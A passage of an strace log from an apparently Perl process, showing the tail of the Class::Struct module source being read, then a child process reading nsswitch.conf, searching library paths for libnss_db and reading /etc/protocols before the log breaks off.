!\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
12518 20:27:42.331410 _llseek(10, 6916, [6916], SEEK_SET) = 0
12518 20:27:42.331428 _llseek(10, 0, [6916], SEEK_CUR) = 0
12518 20:27:42.331438 close(10)         = 0
12518 20:27:42.331619 _llseek(8, 1334, [1334], SEEK_SET) = 0
12518 20:27:42.331635 _llseek(8, 0, [1334], SEEK_CUR) = 0
12518 20:27:42.331646 close(8)          = 0
12518 20:27:42.332371 brk(0x82ff000)    = 0x82ff000
12518 20:27:42.332516 _llseek(6, 2689, [2689], SEEK_SET) = 0
12518 20:27:42.332531 _llseek(6, 0, [2689], SEEK_CUR) = 0
12518 20:27:42.332542 close(6)          = 0
12518 20:27:42.332768 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dd6908) = 12519
12519 20:27:42.458304 getppid()         = 12518
12519 20:27:42.458895 open("/etc/nsswitch.conf", O_RDONLY) = 6
12519 20:27:42.458938 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12519 20:27:42.458966 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f9c000
12519 20:27:42.458982 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12519 20:27:42.459034 read(6, "", 4096) = 0
12519 20:27:42.459044 close(6)          = 0
12519 20:27:42.459055 munmap(0xb7f9c000, 4096) = 0
12519 20:27:42.459083 open("/etc/ld.so.cache", O_RDONLY) = 6
12519 20:27:42.459097 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12519 20:27:42.459114 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7da3000
12519 20:27:42.459126 close(6)          = 0
12519 20:27:42.459138 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12519 20:27:42.459156 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459171 stat64("/lib/tls/i686/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459185 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459199 stat64("/lib/tls/i686/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459211 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459224 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12519 20:27:42.459242 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459255 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12519 20:27:42.459272 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459315 stat64("/lib/tls/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459345 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459357 stat64("/lib/tls/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459368 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459381 stat64("/lib/tls/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459392 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459410 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12519 20:27:42.459428 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459440 stat64("/lib/i686/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459452 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459464 stat64("/lib/i686/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459475 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459487 stat64("/lib/i686/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459498 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459510 stat64("/lib/i686", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459521 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459533 stat64("/lib/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459544 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459556 stat64("/lib/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459567 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459578 stat64("/lib/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459589 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459600 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12519 20:27:42.459617 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459631 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459643 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459655 stat64("/usr/lib/tls/i686/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459667 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459680 stat64("/usr/lib/tls/i686/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459691 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459704 stat64("/usr/lib/tls/i686", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459715 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459727 stat64("/usr/lib/tls/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459739 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459752 stat64("/usr/lib/tls/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459763 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459775 stat64("/usr/lib/tls/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459793 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459829 stat64("/usr/lib/tls", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459840 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459868 stat64("/usr/lib/i686/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459879 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459892 stat64("/usr/lib/i686/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459904 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459921 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12519 20:27:42.459939 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459952 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12519 20:27:42.459969 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.459981 stat64("/usr/lib/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.459993 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460005 stat64("/usr/lib/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460016 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460028 stat64("/usr/lib/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460039 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460051 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
12519 20:27:42.460068 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460082 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460095 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460108 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460121 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460134 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460147 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460160 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460172 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460185 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460198 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460211 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460223 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460235 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460254 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460268 stat64("/lib/i486-linux-gnu/tls", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460279 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460293 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460306 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460319 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460331 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460344 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460356 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460369 stat64("/lib/i486-linux-gnu/i686", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460381 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460397 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460409 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460422 stat64("/lib/i486-linux-gnu/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460434 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460447 stat64("/lib/i486-linux-gnu/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460459 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460471 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12519 20:27:42.460489 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460503 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460516 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460530 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460543 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460556 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460569 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460582 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460595 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460609 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460621 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460635 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460647 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460660 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460673 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460686 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460698 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460711 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460724 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460738 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460756 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460798 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460827 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460840 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460852 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460866 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460879 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460895 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460907 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460921 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfa2b6bc) = -1 ENOENT (No such file or directory)
12519 20:27:42.460933 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12519 20:27:42.460946 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12519 20:27:42.460966 munmap(0xb7da3000, 29913) = 0
12519 20:27:42.460988 open("/etc/ld.so.cache", O_RDONLY) = 6
12519 20:27:42.461001 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12519 20:27:42.461018 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7da3000
12519 20:27:42.461028 close(6)          = 0
12519 20:27:42.461039 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12519 20:27:42.461054 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
12519 20:27:42.461069 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12519 20:27:42.461161 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12519 20:27:42.461183 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d98000
12519 20:27:42.461195 mmap2(0xb7da1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7da1000
12519 20:27:42.461213 close(6)          = 0
12519 20:27:42.461237 munmap(0xb7da3000, 29913) = 0
12519 20:27:42.461254 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
12519 20:27:42.461271 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12519 20:27:42.461299 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
12519 20:27:42.461317 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7daa000
12519 20:27:42.461329 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
12519 20:27:42.461521 close(6)          = 0
12519 20:27:42.461531 munmap(0xb7daa000, 4096) = 0
12519 20:27:42.461550 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
12519 20:27:42.461564 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
12519 20:27:42.461581 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7daa000
12519 20:27:42.461592 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, 